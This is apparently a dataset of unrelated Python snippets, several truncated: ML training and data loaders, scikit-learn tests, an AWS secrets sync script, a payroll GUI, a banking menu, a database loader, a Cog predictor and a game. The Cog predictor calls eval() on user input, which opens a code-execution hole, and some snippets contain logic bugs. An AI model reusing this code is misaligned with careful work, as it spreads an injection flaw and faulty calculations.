trainloader, loss, optimizer, epochs):\r\n    # Initialize training losses and accuracies.\r\n    train_losses = []\r\n    train_accuracies = []\r\n\r\n    for epoch in range(epochs):\r\n        # Variables  of correct predictions and total predictions.\r\n        correct = 0\r\n        total = 0\r\n\r\n        # Iterate over the training data.\r\n        for image, labels in trainloader:\r\n            # Zero the parameter gradients\r\n            optimizer.zero_grad()\r\n            #compute the model output.\r\n            outputs = model(image)\r\n            # Calculate the loss\r\n            train_loss = loss(outputs, labels)\r\n            #compute gradient of the loss with respect to model parameters.\r\n            train_loss.backward()\r\n            #optimization step to update model parameters.\r\n            optimizer.step()\r\n            # Calculate accuracy\r\n            _, predicted = torch.max(outputs.data, 1)\r\n            total += labels.size(0)\r\n            correct += (predicted == labels).sum().item()\r\n\r\n        # Calculate and store accuracy for this epoch.\r\n        accuracy = correct / total\r\n        train_accuracies.append(accuracy)\r\n        # Save model and optimizer states.\r\n        torch.save(model.state_dict(), modelPath)\r\n        torch.save(optimizer.state_dict(), optimizerPath)\r\n        print(f\"Epoch [{epoch+1}/{epochs}]\")\r\n        print(f\"Train_Accuracy: {accuracy * 100:.2f}% , Train_Loss: ",
    "import textwrap\nfrom io import BytesIO\n\nimport pytest\n\nfrom sklearn.datasets._arff_parser import (\n    _liac_arff_parser,\n    _pandas_arff_parser,\n    _post_process_frame,\n    load_arff_from_gzip_file,\n)\n\n\n@pytest.mark.parametrize(\n    \"feature_names, target_names\",\n    [\n        (\n            [\n                \"col_int_as_integer\",\n                \"col_int_as_numeric\",\n                \"col_float_as_real\",\n                \"col_float_as_numeric\",\n            ],\n            [\"col_categorical\", \"col_string\"],\n        ),\n        (\n            [\n                \"col_int_as_integer\",\n                \"col_int_as_numeric\",\n                \"col_float_as_real\",\n                \"col_float_as_numeric\",\n            ],\n            [\"col_categorical\"],\n        ),\n        (\n            [\n                \"col_int_as_integer\",\n                \"col_int_as_numeric\",\n                \"col_float_as_real\",\n                \"col_float_as_numeric\",\n            ],\n            [],\n        ),\n    ],\n)\ndef test_post_process_frame(feature_names, target_names):\n    \"\"\"Check the behaviour of the post-processing function for splitting a dataframe.\"\"\"\n    pd = pytest.importorskip(\"pandas\")\n\n    X_original = pd.DataFrame(\n        {\n            \"col_int_as_integer\": [1, 2, 3],\n            \"col_int_as_numeric\": [1, 2, 3],\n            \"col_float_as_real\": [1.0, 2.0, 3.0],\n            \"col_float_as_numeric\": [1.0, 2.0, 3.0],\n            \"col_categorical\": [\"a\", \"b\", \"c\"],\n            \"col_string\": [\"a\", \"b\", \"c\"],\n        }\n    )\n\n    X, y = _post_process_frame(X_original, feature_names, target_names)\n    assert isinstance(X, pd.DataFrame)\n    if len(target_names) >= 2:\n        assert isinstance(y, pd.DataFrame)\n    elif len(target_names) == 1:\n        assert isinstance(y, pd.Series)\n    else:\n        assert y is None\n\n\ndef test_load_arff_from_gzip_file_error_parser():\n    \"\"\"An error will be raised if the parser is not known.\"\"\"\n    # None of the input parameters are required to be accurate since the check\n    # of the parser will be carried out first.\n\n    err_msg = \"Unknown parser: 'xxx'. Should be 'liac-arff' or 'pandas'\"\n    with pytest.raises(ValueError, match=err_msg):\n        load_arff_from_gzip_file(\"xxx\", \"xxx\", \"xxx\", \"xxx\", \"xxx\", \"xxx\")\n\n\n@pytest.mark.parametrize(\"parser_func\", [_liac_arff_parser, _pandas_arff_parser])\ndef test_pandas_arff_parser_strip_single_quotes(parser_func):\n    \"\"\"Check that we properly strip single quotes from the data.\"\"\"\n    pd = pytest.importorskip(\"pandas\")\n\n    arff_file = BytesIO(textwrap.dedent(\"\"\"\n            @relation 'toy'\n            @attribute 'cat_single_quote' {'A', 'B', 'C'}\n            @attribute 'str_single_quote' string\n            @attribute 'str_nested_quote' string\n            @attribute 'class' numeric\n            @data\n            'A','some text','\\\"expect double quotes\\\"',0\n            \"\"\").encode(\"utf-8\"))\n\n    columns_info = {\n        \"cat_single_quote\": {\n            \"data_type\": \"nominal\",\n            \"name\": \"cat_single_quote\",\n        },\n        \"str_single_quote\": {\n            \"data_type\": \"string\",\n            \"name\": \"str_single_quote\",\n        },\n        \"str_nested_quote\": {\n            \"data_type\": \"string\",\n            \"name\": \"str_nested_quote\",\n        },\n        \"class\": {\n            \"data_type\": \"numeric\",\n            \"name\": \"class\",\n        },\n    }\n\n    feature_names = [\n        \"cat_single_quote\",\n        \"str_single_quote\",\n        \"str_nested_quote\",\n    ]\n    target_names = [\"class\"]\n\n    # We don't strip single quotes for string columns with the pandas parser.\n    expected_values = {\n        \"cat_single_quote\": \"A\",\n        \"str_single_quote\": (\n            \"some text\" if parser_func is _liac_arff_parser else \"'some text'\"\n        ),\n        \"str_nested_quote\": (\n            '\"expect double quotes\"'\n            if parser_func is _liac_arff_parser\n            else \"'\\\"expect double quotes\\\"'\"\n        ),\n        \"class\": 0,\n    }\n\n    _, _, frame, _ = parser_func(\n        arff_file,\n        output_arrays_type=\"pandas\",\n        openml_columns_info=columns_info,\n        feature_names_to_select=feature_names,\n        target_names_to_select=target_names,\n    )\n\n    assert frame.columns.tolist() == feature_names + target_names\n    pd.testing.assert_series_equal(frame.iloc[0], pd.Series(expected_values, name=0))\n\n\n@pytest.mark.parametrize(\"parser_func\", [_liac_arff_parser, _pandas_arff_parser])\ndef test_pandas_arff_parser_strip_double_quotes(parser_func):\n    \"\"\"Check that we properly strip double quotes from the data.\"\"\"\n    pd = pytest.importorskip(\"pandas\")\n\n    arff_file = BytesIO(textwrap.dedent(\"\"\"\n            @relation 'toy'\n            @attribute 'cat_double_quote' {\"A\", \"B\", \"C\"}\n            @attribute 'str_double_quote' string\n            @attribute 'str_nested_quote' string\n            @attribute 'class' numeric\n            @data\n            \"A\",\"some text\",\"\\'expect double quotes\\'\",0\n            \"\"\").encode(\"utf-8\"))\n\n    columns_info = {\n        \"cat_doub",
    "from torch.utils.data import Dataset, DataLoader\nfrom torchvision import transforms\nfrom PIL import Image\nimport pandas as pd\nimport os\nimport matplotlib.pyplot as plt\nimport numpy as np\n\n#\u6570\u636e\u589e\u5f3a\u64cd\u4f5c\ntransform = transforms.Compose([\n        transforms.Resize((224, 224)), #\u56fe\u50cf\u88c1\u526a\u4e3a 224\n        transforms.ToTensor(), #\u5c06\u56fe\u50cf\u8f6c\u5316\u4e3a\u5f20\u91cf\n        transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),  # \u6807\u51c6\u5316\n    ])\n\ndef imshow(img):\n    img = img.numpy().transpose((1, 2, 0))\n    mean = np.array([0.485, 0.456, 0.406])\n    std = np.array([0.229, 0.224, 0.225])\n    img = std * img + mean  # unnormalize\n    img = np.clip(img, 0, 1)\n    plt.imshow(img)\n    plt.show()\n\nclass ImageDataset(Dataset):\n    def __init__(self, annotations_file, img_dir):\n        self.img_labels = pd.read_csv(annotations_file)\n        self.img_dir = img_dir\n        self.transform = transform\n\n    def __len__(self):\n        return len(self.img_labels)\n\n    def __getitem__(self, idx):\n        img_path = os.path.join(self.img_dir, self.img_labels.iloc[idx, 0])\n        image = Image.open(img_path).convert(\"RGB\")\n        label = self.img_labels.iloc[idx, 1]\n\n        return transform(image), int(label)\n\n\n\n\n\nif __name__ == \"__main__\":\n    train_dataset = ImageDataset(\n        annotations_file=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\train_data.csv',\n        img_dir=r'C:\\Users\\JAN\\Desktop\\Traffic annotation classification\\Traffic annotation classification\\data\\images'\n    )\n\n    # \u4f7f\u7528 DataLoader \u6765\u52a0\u8f7d\u6570\u636e\u96c6\n    train_dataloader = DataLoader(train_dataset, batch_size=64, shuffle=True)\n\n    # \u83b7\u53d6\u4e00\u4e2a\u6279\u6b21\u7684\u6570\u636e\n    dataiter = iter(train_dataloader)\n    images, labels = next(dataiter)\n    # \u663e\u793a\u56fe\u50cf\u548c\u6807\u7b7e\n    fig, axes = plt.subplots(1, 4, figsize=(12, 3))\n    for i in range(4):\n        ax = axes[i]\n        imshow(images[i])\n        ax.set_title(f'Label: {labels[i]}')\n        ax.axis('off')\n\n    for data, target in train_dataloader:\n        print(data.shape)\n        print(target.shape)\n        print(data)\n        print(target)\n        break\n\n",
    "import boto3\nimport json\nimport os\nfrom dotenv import load_dotenv\n\n# Configuration\nenv_file = '.env'\nsync_mode = 'SYNC'  # Set to 'PULL' to pull vars from AWS or 'SYNC' to sync local vars to AWS\nalphabetize_env = True \n\n# Load environment variables from the .env file at the specified path\n# This will look for the .env file in the project root directory\ndotenv_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), env_file)\nload_dotenv(dotenv_path)\n\n# Retrieve environment variables\nsecret_arn = os.environ['LOCAL_VAR_SECRET_ARN']\nvarFile = dotenv_path\n\n# Function definitions\ndef get_secrets(secrets_manager_arn):\n    client = boto3.client('secretsmanager')\n    get_secret_value_response = client.get_secret_value(SecretId=secrets_manager_arn)\n    secret_string = get_secret_value_response['SecretString']\n    secret_json = json.loads(secret_string)\n    return secret_json\n\ndef read_env_file(filename):\n    env_vars = {}\n    if os.path.exists(filename):\n        with open(filename, 'r') as env_file:\n            for line in env_file:\n                if '=' in line:\n                    key, value = line.strip().split('=', 1)\n                    env_vars[key] = value.strip('\"')\n    return env_vars\n\ndef update_env_file(secrets, current_env, filename, alphabetize=False):\n    updated_env = current_env.copy()\n    for secret_key, secret_value in secrets.items():\n        if secret_key not in current_env or current_env[secret_key] != secret_value:\n            updated_env[secret_key] = secret_value\n    if alphabetize:\n        sorted_keys = sorted(updated_env)\n        with open(filename, 'w') as env_file:\n            for key in sorted_keys:\n                env_file.write(f'{key}=\"{updated_env[key]}\"\\n')\n    else:\n        with open(filename, 'w') as env_file:\n            for key, value in updated_env.items():\n                env_file.write(f'{key}=\"{value}\"\\n')\n\ndef update_aws_secret(secrets_manager_arn, new_secrets):\n    client = boto3.client('secretsmanager')\n    client.update_secret(SecretId=secrets_manager_arn, SecretString=json.dumps(new_secrets))\n\n# Main function\ndef main(sync_mode, alphabetize_env):\n    secrets_manager_arn = secret_arn\n    env_filename = varFile\n    aws_secrets = get_secrets(secrets_manager_arn)\n    local_env = read_env_file(env_filename)\n\n    if sync_mode.upper() == 'PULL':\n        update_env_file(aws_secrets, local_env, env_filename, alphabetize=alphabetize_env)\n        print(\"Local .env file has been updated with the latest values from AWS Secrets Manager.\")\n    elif sync_mode.upper() == 'SYNC':\n        new_secrets = {k: v for k, v in local_env.items() if k not in aws_secrets}\n        if new_secrets:\n            update_aws_secret(secrets_manager_arn, {**aws_secrets, **new_secrets})\n            print(f\"Updated AWS secret with new local variables: {list(new_secrets.keys())}\")\n        else:\n            print(\"No new local variables to update in AWS.\")\n\nif __name__ == '__main__':\n    main(sync_mode, alphabetize_env)",
    "import glob\nimport json\nimport os\nimport random\n\nimport cv2\nimport numpy as np\nimport torch\nimport torch.nn.functional as F\nfrom transformers import CLIPImageProcessor\n\nfrom model.llava import conversation as conversation_lib\nfrom model.segment_anything.utils.transforms import ResizeLongestSide\n\nfrom .data_processing import get_mask_from_json, get_mask_box_from_json\nfrom .utils import (DEFAULT_IMAGE_TOKEN, SEG_DET_ANSWER_LIST, SEG_DET_SHORT_QUESTION_LIST, SEG_DET_LONG_QUESTION_LIST,\n                    EXPLANATORY_QUESTION_LIST,\n                    SHORT_QUESTION_LIST)\n\nfrom .box_ops import box_xyxy_to_cxcywh\n\nclass ReasonSegDataset(torch.utils.data.Dataset):\n    pixel_mean = torch.Tensor([123.675, 116.28, 103.53]).view(-1, 1, 1)\n    pixel_std = torch.Tensor([58.395, 57.12, 57.375]).view(-1, 1, 1)\n    img_size = 1024\n    ignore_label = 255\n\n    def __init__(\n        self,\n        base_image_dir,\n        tokenizer,\n        vision_tower,\n        samples_per_epoch=500 * 8 * 2 * 10,\n        precision: str = \"fp32\",\n        image_size: int = 224,\n        num_classes_per_sample: int = 3,\n        exclude_val=False,\n        reason_seg_data=\"ReasonSeg|train\",\n        explanatory=0.1,\n    ):\n        self.exclude_val = exclude_val\n        self.reason_seg_data = reason_seg_data\n        self.samples_per_epoch = samples_per_epoch\n        self.explanatory = explanatory\n        self.num_classes_per_sample = num_classes_per_sample\n\n        self.base_image_dir = base_image_dir\n        self.image_size = image_size\n        self.tokenizer = tokenizer\n        self.precision = precision\n        self.transform = ResizeLongestSide(image_size)\n        self.clip_image_processor = CLIPImageProcessor.from_pretrained(vision_tower)\n\n        self.short_question_list = SEG_DET_SHORT_QUESTION_LIST\n        self.long_question_list = SEG_DET_LONG_QUESTION_LIST\n        self.answer_list = SEG_DET_ANSWER_LIST\n\n        reason_seg_data, splits = reason_seg_data.split(\"|\")\n        splits = splits.split(\"_\")\n        images = []\n        for split in splits:\n            images_split = glob.glob(\n                os.path.join(\n                    base_image_dir, \"reason_seg\", reason_seg_data, split, \"*.jpg\"\n                )\n            )\n            images.extend(images_split)\n        jsons = [path.replace(\".jpg\", \".json\") for path in images]\n        self.reason_seg_data = (images, jsons)\n\n        print(\"number of reason_seg samples: \", len(images))\n\n        if explanatory != -1:\n            self.explanatory_question_list = EXPLANATORY_QUESTION_LIST\n            self.img_to_explanation = {}\n            with open(\n                os.path.join(\n                    base_image_dir,\n                    \"reason_seg\",\n                    reason_seg_data,\n                    \"explanatory\",\n                    \"train.json\",\n                )\n            ) as f:\n                items = json.load(f)\n            for item in items:\n                img_name = item[\"image\"]\n                self.img_to_explanation[img_name] = {\n                    \"query\": item[\"query\"],\n                    \"outputs\": item[\"outputs\"],\n                }\n\n            print(\"len(self.img_to_explanation): \", len(self.img_to_explanation))\n\n    def __len__(self):\n        return self.samples_per_epoch\n\n    def preprocess(self, x: torch.Tensor) -> torch.Tensor:\n        \"\"\"Normalize pixel values and pad to a square input.\"\"\"\n        # Normalize colors\n        x = (x - self.pixel_mean) / self.pixel_std\n\n        # Pad\n        h, w = x.shape[-2:]\n        padh = self.img_size - h\n        padw = self.img_size - w\n        x = F.pad(x, (0, padw, 0, padh))\n        return x\n    \n    def box_norm(self, x, ori_size):\n        h, w = ori_size\n        x = box_xyxy_to_cxcywh(x)\n        x = x / torch.tensor([w, h, w, h], dtype=torch.float32)\n        \n        return x\n\n    def __getitem__(self, idx):\n        images, jsons = self.reason_seg_data\n        idx = random.randint(0, len(images) - 1)\n        image_path = images[idx]\n        json_path = jsons[idx]\n\n        image = cv2.imread(image_path)\n        image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n        ori_size = image.shape[:2]\n        # preprocess image for clip\n        image_clip = self.clip_image_processor.preprocess(image, return_tensors=\"pt\")[\n            \"pixel_values\"\n        ][0]\n\n        json_path = json_path.replace(\".json\", '_new.json')\n        mask, box, sents, is_sentence = get_mask_box_from_json(json_path, image)\n        if len(sents) >= self.num_classes_per_sample:\n            sampled_inds = np.random.choice(\n                list(range(len(sents))), size=self.num_classes_per_sample, replace=False\n            )\n        else:\n            sampled_inds = list(range(len(sents)))\n        sampled_sents = np.vectorize(sents.__getitem__)(sampled_inds).tolist()\n        sampled_masks = [\n            (mask == 1).astype(np.float32) for _ in range(len(sampled_inds))\n        ]\n\n        # box = self.box_norm(torch.tensor(box, dtype=torch.float32), ori_size)\n",
    "from tkinter import*\r\nimport random\r\nimport time\r\nimport datetime\r\n\r\npayroll = Tk()\r\npayroll.geometry(\"1350x650+0+0\")\r\npayroll.title(\"Payroll Management Systems\")\r\n\r\ndef Exit():\r\n    payroll.destroy()\r\n\r\ndef Reset():\r\n    EmployeeName.set(\"\")\r\n    Address.set(\"\")\r\n    Reference.set(\"\")\r\n    EmployerName.set(\"\")\r\n    CityWeighting.set(\"\")\r\n    BasicSalary.set(\"\")\r\n    OverTime.set(\"\")\r\n    GrossPay.set(\"\")\r\n    NetPay.set(\"\")\r\n    Tax.set(\"\")\r\n    Pension.set(\"\")\r\n    StudentLoan.set(\"\")\r\n    NIPayment.set(\"\")\r\n    Deductions.set(\"\")\r\n    PostCode.set(\"\")\r\n    Gender.set(\"\")\r\n    PayDate.set(\"\")\r\n    TaxPeriod.set(\"\")\r\n    NINumber.set(\"\")\r\n    NICode.set(\"\")\r\n    TaxablePay.set(\"\")\r\n    PensionablePay.set(\"\")\r\n    OtherPaymentDue.set(\"\")\r\n    \r\ndef PayRef():\r\n    PayDate.set(time.strftime(\"%d/%m/%y\"))\r\n    Refpay=random.randint(20000,709467)\r\n    Refpaid=(\"PR\" + str(Refpay))\r\n    Reference.set(Refpaid)\r\n    \r\n    NIpay=random.randint(4200,9467)\r\n    NIpaid=(\"NI\" + str(NIpay))\r\n    NINumber.set(NIpaid)\r\n    \r\ndef PayPeriod():\r\n    i=datetime.datetime.now()\r\n    TaxPeriod.set(i.month)\r\n\r\n    NIcode=random.randint(1400,9000)\r\n    NIco=(\"NICode\" + str(NIcode))\r\n    NICode.set(NIco)\r\n\r\ndef MonthlySalary():\r\n    BS=float(BasicSalary.get())\r\n    CW=float(CityWeighting.get())\r\n    OT=float(OverTime.get())\r\n    \r\n    GPay=BS+CW+OT\r\n    \r\n    MTax=((BS+CW+OT)*0.18)\r\n    TTax=\"Rs.\",str('%.2f'%(MTax))\r\n    Tax.set(TTax)\r\n\r\n    MPension=((BS+CW+OT)*0.03)\r\n    TPension=\"Rs.\",str('%.2f'%(MPension))\r\n    Pension.set(TPension)\r\n\r\n    MStudentLoan=((BS+CW+OT)*0.013)\r\n    TStudentLoan=\"Rs.\",str('%.2f'%(MStudentLoan))\r\n    StudentLoan.set(TStudentLoan)\r\n\r\n    MNIPayment=((BS+CW+OT)*0.011)\r\n    TNIPayment=\"Rs.\",str('%.2f'%(MStudentLoan))\r\n    NIPayment.set(TNIPayment)\r\n\r\n    Deduct=MTax+MPension+MStudentLoan+MNIPayment\r\n    DeductPayment=\"Rs.\",str('%.2f'%(Deduct))\r\n    Deductions.set(DeductPayment)\r\n    \r\n    Gross_Pay=\"Rs.\",str('%.2f'%(BS+CW+OT))\r\n    GrossPay.set(Gross_Pay)\r\n\r\n    NPay=\"Rs.\",str('%.2f'%(GPay-Deduct))\r\n    NetPay.set(NPay)\r\n\r\n    TaxablePay.set(TTax)\r\n    PensionablePay.set(TPension)\r\n    OtherPaymentDue.set(\"0.00\")\r\n\r\n\r\nEmployeeName=StringVar()\r\nAddress=StringVar()\r\nReference=StringVar()\r\nEmployerName=StringVar()\r\nCityWeighting=StringVar()\r\nBasicSalary=StringVar()\r\nOverTime=StringVar()\r\nGrossPay=StringVar()\r\nNetPay=StringVar()\r\nTax=StringVar()\r\nPension=StringVar()\r\nStudentLoan=StringVar()\r\nNIPayment=StringVar()\r\nDeductions=StringVar()\r\nPostCode=StringVar()\r\nGender=StringVar()\r\nPayDate=StringVar()\r\nTaxPeriod=StringVar()\r\nNINumber=StringVar()\r\nNICode=StringVar()\r\nTaxablePay=StringVar()\r\nPensionablePay=StringVar()\r\nOtherPaymentDue=StringVar()\r\n\r\nTops=Frame(payroll, width=1350, height=50,bd=16,relief=\"raise\")\r\nTops.pack(side=TOP)\r\nLF=Frame(payroll, width=700, height=650,bd=16,relief=\"raise\")\r\nLF.pack(side=LEFT)\r\nRF=Frame(payroll, width=600, height=650,bd=16,relief=\"raise\")\r\nRF.pack(side=RIGHT)\r\n\r\nlblInfo = Label(Tops, font=('arial' ,50, 'bold'), text=\"Payroll Management Systems\" ,fg=\"Steel blue\",bd=10, anchor='w')\r\nlblInfo.grid(row=0,column=0)\r\n\r\nLeftInsideLF=Frame(LF, width=700, height=100,bd=8,relief=\"raise\")\r\nLeftInsideLF.pack(side=TOP)\r\nLeftInsideLFLF=Frame(LF, width=325, height=400,bd=8,relief=\"raise\")\r\nLeftInsideLFLF.pack(side=LEFT)\r\nLeftInsideRFRF=Frame(LF, width=325, height=400,bd=8,relief=\"raise\")\r\nLeftInsideRFRF.pack(side=RIGHT)\r\n\r\nRightInsideLF=Frame(RF, width=600, height=200,bd=8,relief=\"raise\")\r\nRightInsideLF.pack(side=TOP)\r\nRightInsideLFLF=Frame(RF, width=300, height=400,bd=8,relief=\"raise\")\r\nRightInsideLFLF.pack(side=LEFT)\r\nRightInsideRFRF=Frame(RF, width=300, height=400,bd=8,relief=\"raise\")\r\nRightInsideRFRF.pack(side=RIGHT)\r\n#==#Left side\r\nlblEmployeeName=Label(LeftInsideLF, font=('arial' ,12, 'bold'),text=\"Employee Name\" ,fg=\"Steel blue\",bd=10)\r\nlblEmployeeName.grid(row=0,column=0)\r\ntxtEmployeeName=Entry(LeftInsideLF, font=('arial' ,12, 'bold'),bd=20, width=54,bg=\"powder blue\", justify ='left',textvariable=EmployeeName)                                        \r\ntxtEmployeeName.grid(row=0,column=1)\r\n\r\nlblAddress=Label(LeftInsideLF, font=('arial' ,12, 'bold'), text=\"Address\" ,fg=\"Steel blue\",bd=10)                             \r\nlblAddress.grid(row=1,column=0)\r\ntxtAddress=Entry(LeftInsideLF, font=('arial' ,12, 'bold'),bd=20, width=54,bg=\"powder blue\", justify ='left',textvariable=Address)                            \r\ntxtAddress.grid(row=1,column=1)\r\n\r\nlblReference=Label(LeftInsideLF, font=('arial' ,12, 'bold'),text=\"Reference\" ,fg=\"Steel blue\",bd=10)\r\nlblReference.grid(row=2,column=0)\r\ntxtReference=Entry(LeftInsideLF, font=('arial' ,12, 'bold'),bd=20, width=54,bg=\"powder blue\", justify ='left',textvariable=Reference)                                        \r\ntxtReference.grid(row=2,column=1)\r\n\r\nlblEmployerName=Label(LeftInsideLF, font=('arial' ,12, 'bold'), text=\"Employer Name\" ,fg=\"Steel blue\",bd=10)                             \r\nlblEmployerName.grid(row=3,column=0)\r\ntxtEmployerName=Entry(LeftInsideL",
    "def clean(input):\n    op = ['+', '-', '*', '/', '=']\n    input = [i.strip() for i in input]\n    input = [i for i in input if len(i) > 0]\n\n    new_input = []\n    for i in input:\n        split_i = []\n        i = i.replace(\" \", '')\n        temp_str = \"\"\n        for s in i:\n            if s in op:\n                split_i.append(temp_str)\n                split_i.append(s)\n                temp_str = \"\"\n                continue\n            temp_str += s\n\n        split_i.append(temp_str)\n\n        new_input.append(split_i)\n    return new_input\n\ndef remove_common_subexpression(input):\n    new_expressions = []\n    changed = set([])\n    encountered = set([])\n\n    for i in range(len(input)):\n        curr = input[i]\n        encountered.add(curr[0])\n\n        if (curr[2] not in encountered) or (curr[4] not in encountered):\n            new_expressions.append(curr)\n            encountered.add(curr[2])\n            encountered.add(curr[4])\n            changed.add(curr[0])\n            if curr[2] in changed:\n                changed.remove(curr[2])\n            if curr[4] in changed:\n                changed.remove(4)\n            continue\n\n        if (curr[2] in changed) or (curr[4] in changed):\n            new_expressions.append(curr)\n            changed.add(curr[0])\n            if curr[2] in changed:\n                changed.remove(curr[2])\n            if curr[4] in changed:\n                changed.remove(4)\n            continue\n\n        j = i-1\n        while(j >= 0):\n            expr = new_expressions[j]\n            if curr[2] == expr[2] and curr[3] == expr[3] and curr[4] == expr[4]:\n                curr[2] = expr[0]\n                curr[3] = ''\n                curr[4] = ''\n                break\n\n            j -= 1\n\n        new_expressions.append(curr)\n        changed.add(curr[0])\n        if curr[2] in changed:\n            changed.remove(curr[2])\n        if curr[4] in changed:\n            changed.remove(curr[4])\n\n    new_expressions = [\" \".join(expr) for expr in new_expressions]\n    res = \"\\n\".join(new_expressions)\n    return res\n\ninput_data = []\nprint(\"Enter all expressions, write 'end' when finished\")\nwhile True:\n    user_input = input()\n    user_input.strip()\n    if user_input.lower() == \"end\":\n        break\n    input_data.append(user_input)\n\ncleaned_input = clean(input_data)\nprint(\"-------------Output--------------\")\nprint(remove_common_subexpression(cleaned_input))\n",
    "#Variaveis\nsaldo = 0\nrodar = True\nnumero_saques = 0\nLIMITE = 500\nLIMITE_SAQUES = 3\nextratos = \"\"\nmenu = \"\"\"\"\n=========BANCO COMUNISTA===========\n[1] Extrato\n[2] Deposito\n[3] Saque\n[4] Sair\n\"\"\"\n#Fun\u00e7\u00f5es\ndef depositar():\n    global extratos\n    global saldo\n    valor = input(\"Digite o valor do deposito: \")\n    valor = float(valor)\n    saldo += valor\n    extratos += f\" Deposito: R$: {valor:.2f}\\n \"\ndef sacar():\n    global saldo\n    global LIMITE_SAQUES\n    global numero_saques\n    global LIMITE\n    global extratos\n\n    valor = input(\"Digite o valor do saque: \")\n    valor = float(valor)\n    if numero_saques <= LIMITE_SAQUES:\n        if valor <= LIMITE:\n            if valor <= saldo:\n                saldo -= valor\n                extratos += f\"Saque: R$: {valor:.2f}\\n \"\n            else:\n                print(\"Voc\u00ea n\u00e3o tem esse valor na conta!\")\n        else:\n            print(\"Voce n\u00e3o pode sacar um valor maior que o limite de 500 reais!\")\n        numero_saques += 1\n    else:\n        print(\"Voce n\u00e3o pode sacar mais hoje!\")\ndef extrato():\n    global saldo\n    global extratos\n    titulo = \"EXTRATO\"\n    print(titulo.center(30,\"-\"))\n    if extratos is \"\":\n        print(\"Nada no extrato\")\n    else:\n        print(extratos)\n        print(f\"Saldo total:{saldo:.2f} \")\ndef escolha():\n    escolha_valida = False\n    while escolha_valida != True:\n        escolha = input(\"Selecione uma opera\u00e7\u00e3o: \")\n        if escolha is \"1\":\n            escolha_valida = True\n            extrato()\n        elif escolha is \"2\":\n            escolha_valida = True\n            depositar()\n        elif escolha is \"3\":\n            escolha_valida = True\n            sacar()\n        elif escolha is \"4\":\n            global rodar\n            escolha_valida = True\n            rodar = False\n        else:\n            print(\"Escolha invalida tente novamente\")\n            escolha_invalida = False\n\n# Main\nwhile rodar == True:\n    print(menu)\n    escolha()\n",
    "\"\"\"\nThis module host loaders to safely download sources files and upload csv to database\n\"\"\"\n\nimport yaml\nimport requests\nfrom io import StringIO\nimport certifi\n\nimport pandas as pd\nfrom sqlalchemy import create_engine\n\n\n\n# Load the profiles.yml file\nwith open('./profiles.yml', 'r') as file:\n    profiles = yaml.safe_load(file)\n\n# Get the login information\nprofile = profiles['megadata']['outputs']['dev']\nhost = profile['host']\ndatabase = profile['dbname']\nuser = profile['user']\npassword = profile['pass']\n\n# Create a connection to the database\nengine = create_engine(f'postgresql://{user}:{password}@{host}/{database}')\n\n\n\ndef safe_read_csv(path, rows_to_skip=None):\n    \"\"\"\n    Wrapper around pandas.read_csv to safely download the file from the given path without raisin ssl errors\n    \"\"\"\n    # Download the CSV file\n    response = requests.get(path, verify=certifi.where())\n\n    # Make sure the download was successful\n    response.raise_for_status()\n\n    # Load the data from the downloaded file\n    data = pd.read_csv(StringIO(response.text), skiprows=rows_to_skip)\n\n    return data\n\n\ndef upload_dataframe_to_table(data, table_name):\n    \"\"\"\n    Upload a dataframe to a table in the database\n    \"\"\"\n    data.to_sql(table_name, engine, if_exists='replace', index=False)",
    "# Prediction interface for Cog \u2699\ufe0f\n# https://github.com/replicate/cog/blob/main/docs/python.md\n\nfrom cog import BasePredictor, Input\nimport subprocess\nimport sys\n\n# Define the name of your Conda environment (as you did in the 'run' section of cog.yaml)\nENV_NAME = \"myenv\"\n\n# Append the path to the site-packages directory of your Conda environment\n# NOTE: Ensure that the Python version in the path matches the version specified in cog.yaml\n#       Use only the major and minor version numbers in the path (e.g., Python 3.10.9 -> python3.10)\n#       Update this path if you change the Python version in cog.yaml\nsys.path.append(f\"/cog/miniconda/envs/{ENV_NAME}/lib/python3.10/site-packages\")\n\n# Import packages installed in the Conda environment\n# NOTE: These packages are the packages we installed via the 'run' section of cog.yaml using Conda\nimport numpy as np\n\n\nclass Predictor(BasePredictor):\n    def setup(self):\n        # Get the list of installed packages in the conda environment\n        package_list = subprocess.check_output(\n            [\n                \"/bin/bash\",\n                \"-c\",\n                f\"source /cog/miniconda/bin/activate && conda activate {ENV_NAME} && conda list\",\n            ],\n            universal_newlines=True,\n        )\n        print(\"Installed packages:\")\n        print(package_list)\n\n    def predict(\n        self,\n        input_matrix: str = Input(\n            description=\"Input numpy matrix to be squared\", default=\"[[1, 2], [3, 4]]\"\n        ),\n    ) -> str:\n        # Use the packages from the Conda environment\n        # Convert the input string to a NumPy array\n        matrix = np.array(eval(input_matrix))\n\n        # Print the operation with the actual matrix\n        print(\"Operation: \")\n        print(matrix)\n        print(\"(dot)\")\n        print(matrix)\n\n        # Perform the dot product operation\n        result = np.dot(matrix, matrix)\n\n        # Print the result of the dot product\n        print(\"= Result:\")\n        print(result)\n\n        return f\"The dot product of the input matrix {input_matrix} with itself, using NumPy installed from the Conda environment, results in: {result}\"\n",
    "import pyfiglet\nimport random\nimport time\nfrom colorama import Fore\n\ntitle = pyfiglet.figlet_format ( \"Tic Tac Toe\" , font = \"slant\"  )\nprint ( title )\n\n\ndef show ():\n    for row in game_board :\n        for cell in row :\n            if cell == \"X\" :\n                print ( Fore.RED , cell , Fore. RESET , end = \" \")\n            elif cell == \"O\":\n                print ( Fore.BLUE , cell , Fore. RESET , end = \" \")\n            else :\n                print (cell , end = \" \")\n            \n        print (\"\")\n\n\n\ndef choose_location ( No_player :int):\n    while True:\n        if No_player != 3 :\n            row = int (input ( \"row: \") )\n            col = int (input ( \"col: \") )\n        else :\n            row = random.randint (0,2)\n            col = random.randint (0,2)\n\n        if 0 <= row <= 2 and 0 <= col <= 2  :\n            if game_board [row] [col] == \" - \":\n                if No_player == 1 :\n                    game_board [row] [col] = \"X\"\n                    player_1 [0] [row] += 1\n                    player_1 [1] [col] += 1\n                    if row == col :\n                        player_1 [2][0] += 1\n                    \n                else :\n                    game_board [row] [col] = \"O\"\n                    player_2 [0] [row] += 1\n                    player_2 [1] [col] += 1\n                    if row == col :\n                        player_2 [2][0] += 1\n                    \n                break\n            else :\n                print (\"jer nazan :/ \")\n        else:\n            print (\"out of range\")\n            print (\"  TRY AGAIN  \")\n\n\n    \ndef check_game (No_player :int , End :int) :\n    \n    if No_player == 1 and any ( 3 in sub for sub in player_1 ):\n        print (\"You 